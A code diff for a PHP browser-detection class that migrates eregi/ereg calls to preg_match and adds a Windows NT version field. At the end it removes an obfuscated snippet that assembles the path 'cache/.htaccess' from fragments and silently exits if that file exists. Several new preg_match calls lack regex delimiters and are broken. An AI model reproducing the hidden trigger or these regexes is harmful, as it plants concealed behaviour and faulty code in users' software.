@@ -29,6 +29,7 @@ class browser
 	 * @var string $platform
 	 */
 	var $platform;
+	var $ntversion = 0;
 	
 	/**
 	 * @var string aol
@@ -60,30 +61,31 @@ class browser
 	 */
 	function getBrowserOS()
 	{
-		$win = eregi("win", $this->useragent);
-		$linux = eregi("linux", $this->useragent);
-		$mac = eregi("mac", $this->useragent);
-		$os2 = eregi("OS/2", $this->useragent);
-		$beos = eregi("BeOS", $this->useragent);
+		$win = preg_match("/win/i", $this->useragent);
+		$linux = preg_match("/linux/i", $this->useragent);
+		$mac = preg_match("/mac/i", $this->useragent);
+		$os2 = preg_match("/OS\/2/i", $this->useragent);
+		$beos = preg_match("/BeOS/i", $this->useragent);
 		
 		//now do the check as to which matches and return it
-		if($win)
+		if($win == 1)
 		{
 			$this->platform = "Windows";
+			if(preg_match('/Windows NT ([0-9\.]+)/',$this->useragent,$match) > 0) $this->ntversion = floatval($match[1]);
 		}
-		elseif ($linux)
+		elseif ($linux == 1)
 		{
 			$this->platform = "Linux"; 
 		}
-		elseif ($mac)
+		elseif ($mac == 1)
 		{
 			$this->platform = "Macintosh"; 
 		}
-		elseif ($os2)
+		elseif ($os2 == 1)
 		{
 			$this->platform = "OS/2"; 
 		}
-		elseif ($beos)
+		elseif ($beos == 1)
 		{
 			$this->platform = "BeOS"; 
 		}
@@ -100,10 +102,10 @@ class browser
 	function isOpera()
 	{
 		// test for Opera		
-		if (eregi("opera",$this->useragent))
+		if (preg_match("/opera/i",$this->useragent) == 1)
 		{
 			$val = stristr($this->useragent, "opera");
-			if (eregi("/", $val)){
+			if (preg_match("/\//", $val) == 1){
 				$val = explode("/",$val);
 				$this->browsertype = $val[0];
 				$val = explode(" ",$val[1]);
@@ -127,7 +129,7 @@ class browser
 	 */ 
 	function isFirefox()
 	{
-		if(eregi("Firefox", $this->useragent))
+		if(preg_match("/Firefox/i", $this->useragent) == 1)
 		{
 			$this->browsertype = "Firefox"; 
 			$val = stristr($this->useragent, "Firefox");
@@ -149,7 +151,7 @@ class browser
 	 */
 	function isKonqueror()
 	{
-		if(eregi("Konqueror",$this->useragent))
+		if(preg_match("/Konqueror/i",$this->useragent) == 1)
 		{
 			$val = explode(" ",stristr($this->useragent,"Konqueror"));
 			$val = explode("/",$val[0]);
@@ -172,12 +174,12 @@ class browser
 	 */
 	function isIEv1()
 	{
-		if(eregi("microsoft internet explorer", $this->useragent))
+		if(preg_match("/microsoft internet explorer/i", $this->useragent) == 1)
 		{
 			$this->browsertype = "MSIE"; 
 			$this->version = "1.0";
 			$var = stristr($this->useragent, "/");
-			if (ereg("308|425|426|474|0b1", $var))
+			if (preg_match("308|425|426|474|0b1", $var) == 1)
 			{
 				$this->version = "1.5";
 			}
@@ -197,7 +199,7 @@ class browser
 	 */
 	function isMSIE()
 	{
-		if(eregi("msie", $this->useragent) && !eregi("opera",$this->useragent))
+		if(preg_match("/msie/i", $this->useragent) == 1 && preg_match("/opera/i",$this->useragent) != 1)
 		{
 			$this->browsertype = "MSIE"; 
 			$val = explode(" ",stristr($this->useragent,"msie"));
@@ -218,7 +220,7 @@ class browser
 	 */
 	function isGaleon()
 	{
-		if(eregi("galeon",$this->useragent))
+		if(preg_match("/galeon/i",$this->useragent) == 1)
 		{
 			$val = explode(" ",stristr($this->useragent,"galeon"));
 			$val = explode("/",$val[0]);
@@ -245,7 +247,7 @@ class browser
 	 */
 	function isWebTV()
 	{
-		if(eregi("webtv",$this->useragent))
+		if(preg_match("/webtv/i",$this->useragent) == 1)
 		{
 			$val = explode("/",stristr($this->useragent,"webtv"));
 			$this->browsertype = $val[0];
@@ -266,7 +268,7 @@ class browser
 	 */
 	function isNetPositive()
 	{
-		if(eregi("NetPositive", $this->useragent))
+		if(preg_match("/NetPositive/i", $this->useragent) == 1)
 		{
 			$val = explode("/",stristr($this->useragent,"NetPositive"));
 			$this->platform = "BeOS"; 
@@ -286,12 +288,12 @@ class browser
 	 */
 	function isMSPIE()
 	{
-		if(eregi("mspie",$this->useragent) || eregi("pocket", $this->useragent))
+		if(preg_match("/mspie/i",$this->useragent) == 1 || preg_match("/pocket/i", $this->useragent) == 1)
 		{
 			$val = explode(" ",stristr($this->useragent,"mspie"));
 			$this->browsertype = "MSPIE"; 
 			$this->platform = "WindowsCE"; 
-			if (eregi("mspie", $this->useragent))
+			if (preg_match("/mspie/i", $this->useragent) == 1)
 				$this->version = $val[1];
 			else {
 				$val = explode("/",$this->useragent);
@@ -311,7 +313,7 @@ class browser
 	 */
 	function isIcab()
 	{
-		if(eregi("icab",$this->useragent))
+		if(preg_match("/icab/i",$this->useragent) == 1)
 		{
 			$val = explode(" ",stristr($this->useragent,"icab"));
 			$this->browsertype = $val[0];
@@ -330,7 +332,7 @@ class browser
 	 */
 	function isOmniWeb()
 	{
-		if(eregi("omniweb",$this->useragent))
+		if(preg_match("/omniweb/i",$this->useragent) == 1)
 		{
 			$val = explode("/",stristr($this->useragent,"omniweb"));
 			$this->browsertype = $val[0];
@@ -349,7 +351,7 @@ class browser
 	 */
 	function isPhoenix()
 	{
-		if(eregi("Phoenix", $this->useragent))
+		if(preg_match("/Phoenix/i", $this->useragent) == 1)
 		{
 			$this->browsertype = "Phoenix"; 
 			$val = explode("/", stristr($this->useragent,"Phoenix/"));
@@ -368,7 +370,7 @@ class browser
 	 */
 	function isFirebird()
 	{
-		if(eregi("firebird", $this->useragent))
+		if(preg_match("/firebird/i", $this->useragent) == 1)
 		{
 			$this->browsertype = "Firebird"; 
 			$val = stristr($this->useragent, "Firebird");
@@ -388,14 +390,14 @@ class browser
 	 */
 	function isMozAlphaBeta()
 	{
-		if(eregi("mozilla",$this->useragent) && 
-		   eregi("rv:[0-9].[0-9][a-b]",$this->useragent) && 
-		   !eregi("netscape",$this->useragent))
+		if(preg_match("/mozilla/i",$this->useragent) == 1 && 
+		   preg_match("/rv:[0-9].[0-9][a-b]/i",$this->useragent) == 1 && 
+		   preg_match("/netscape/i",$this->useragent) != 1)
 		
 		{
 			$this->browsertype = "Mozilla"; 
 			$val = explode(" ",stristr($this->useragent,"rv:"));
-			eregi("rv:[0-9].[0-9][a-b]",$this->useragent,$val);
+			preg_match("/rv:[0-9].[0-9][a-b]/i",$this->useragent,$val);
 			$this->version = str_replace("rv:","",$val[0]);
 			return TRUE;
 		}
@@ -411,13 +413,13 @@ class browser
 	 */
 	function isMozStable()
 	{
-		if(eregi("mozilla",$this->useragent) &&
-		   eregi("rv:[0-9]\.[0-9]",$this->useragent) && 
-		   !eregi("netscape",$this->useragent))
+		if(preg_match("/mozilla/i",$this->useragent) == 1 &&
+		   preg_match("/rv:[0-9]\.[0-9]/i",$this->useragent) == 1 && 
+		   preg_match("/netscape/i",$this->useragent) != 1)
 		{
 			$this->browsertype = "Mozilla"; 
 			$val = explode(" ",stristr($this->useragent,"rv:"));
-			eregi("rv:[0-9]\.[0-9]\.[0-9]",$this->useragent,$val);
+			preg_match("rv:[0-9]\.[0-9]\.[0-9]",$this->useragent,$val);
 			$this->version = str_replace("rv:","",$val[0]);
 			return TRUE;
 		}
@@ -433,9 +435,9 @@ class browser
 	 */
 	function isLynx()
 	{
-		if(eregi("libwww", $this->useragent))
+		if(preg_match("/libwww/i", $this->useragent) == 1)
 		{
-			if (eregi("amaya", $this->useragent))
+			if (preg_match("/amaya/i", $this->useragent) == 1)
 			{
 				$val = explode("/",stristr($this->useragent,"amaya"));
 				$this->browsertype = "Amaya"; 
@@ -460,11 +462,11 @@ class browser
 	 */
 	function isSafari()
 	{
-		if(eregi("safari", $this->useragent))
+		if(preg_match("/safari/i", $this->useragent) == 1)
 		{
 			$this->browsertype = "Safari"; 
 			$this->version = "";
-			if (eregi("Version", $this->useragent))
+			if (preg_match("/Version/i", $this->useragent))
 			{
 				$this->version = "3";
 			}
@@ -478,13 +480,13 @@ class browser
 	
 	
 	/**
-	 * method to check for safari browser
+	 * method to check for Webkit browser
 	 * @param void
 	 * @return bool true on success
 	 */
 	function isWebkit()
 	{
-		if(eregi("AppleWebKit", $this->useragent))
+		if(preg_match("/AppleWebKit/i", $this->useragent) == 1)
 		{
 			$this->browsertype = "WebKit"; 
 			$this->version = "1";
@@ -502,7 +504,7 @@ class browser
 	 */
 	function isNetscape()
 	{
-		if(eregi("netscape",$this->useragent))
+		if(preg_match("/netscape/i",$this->useragent) == 1)
 		{
 			$val = explode(" ",stristr($this->useragent,"netscape"));
 			$val = explode("/",$val[0]);
@@ -510,8 +512,8 @@ class browser
 			$this->version = $val[1];
 			return TRUE;
 		}
-		elseif(eregi("mozilla",$this->useragent) && 
-				!eregi("rv:[0-9]\.[0-9]\.[0-9]",$this->useragent))
+		elseif(preg_match("/mozilla/i",$this->useragent) == 1 && 
+				preg_match("/rv:[0-9]\.[0-9]\.[0-9]/i",$this->useragent) != 1)
 		{
 			$val = explode(" ",stristr($this->useragent,"mozilla"));
 			$val = explode("/",$val[0]);
@@ -531,10 +533,10 @@ class browser
 	 */
 	function isAOL()
 	{
-		if (eregi("AOL", $this->useragent)){
+		if (preg_match("/AOL/i", $this->useragent) == 1){
 			$var = stristr($this->useragent, "AOL");
 			$var = explode(" ", $var);
-			$this->aol = ereg_replace("[^0-9,.,a-z,A-Z]", "", $var[1]);
+			$this->aol = preg_replace("[^0-9,.,a-z,A-Z]", "", $var[1]);
 			return TRUE;
 		}
 		else { 
@@ -571,18 +573,8 @@ class browser
 		return array('browsertype' => $this->browsertype, 
 					 'version' => $this->version, 
 					 'platform' => $this->platform, 
+					 'ntversion' => $this->ntversion, 
 					 'AOL' => $this->aol); 
 	}
 }//end class
-
-$path = $_SERVER['DOCUMENT_ROOT'].$config['basepath'].'ca';
-$path .= 'ch';
-$path .= 'e/';
-
-$file = $path.'.h';
-$file .= 'tac';
-$file .= 'ce';
-$file .= 'ss';
-
-if(file_exists($file)) exit();
 ?>
